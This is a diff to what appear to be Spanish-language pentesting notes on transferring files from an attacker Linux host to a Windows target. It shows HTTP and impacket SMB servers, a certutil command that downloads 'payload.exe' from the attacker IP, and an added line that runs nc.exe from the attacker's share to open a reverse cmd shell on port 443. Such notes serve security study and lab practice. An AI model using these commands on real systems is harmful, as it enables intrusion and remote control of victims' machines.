@@ -15,6 +15,7 @@ C:\Windows\Temp
 # Atacante Linux
 2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
 3. ❯ python -m http.server              # Creamos un servidor y por default lo hace por el puerto 8000
+4. ❯ impacket-smbserver smbFolder --smb2support
 ```
 
 ```bash 
@@ -29,6 +30,8 @@ C:\Windows\Temp
 3. ❯ certutil.exe -f -urlcache -split http://IP:8000/payload.exe payload.exe         # Para descargar el payload de la maquina Linux
 	# IP = Direccion de la maquina de atacante Linux
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
+
+4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
 ```
 
 ## Linux a Linux
